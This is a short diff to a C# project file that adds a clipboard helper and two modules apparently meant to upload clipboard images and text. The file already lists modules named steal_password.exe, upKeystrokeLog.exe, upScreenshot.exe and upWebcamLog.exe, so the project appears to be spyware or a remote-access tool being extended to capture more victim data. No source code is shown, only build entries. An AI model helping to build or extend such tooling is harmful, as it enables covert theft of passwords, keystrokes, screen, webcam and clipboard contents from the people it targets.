@@ -126,6 +126,7 @@
     <Compile Include="CB_Pic.xaml.cs">
       <DependentUpon>CB_Pic.xaml</DependentUpon>
     </Compile>
+    <Compile Include="ClipboardHelper.cs" />
     <Compile Include="Email.xaml.cs">
       <DependentUpon>Email.xaml</DependentUpon>
     </Compile>
@@ -326,6 +327,8 @@
     <Content Include="module\steal_password.exe" />
     <Content Include="module\sync.exe" />
     <Content Include="module\sync_up.exe" />
+    <Content Include="module\upClipboardImg.exe" />
+    <Content Include="module\upClipboardText.exe" />
     <Content Include="module\upKeystrokeLog.exe" />
     <Content Include="module\upScreenshot.exe" />
     <Content Include="module\upWebcamLog.exe" />
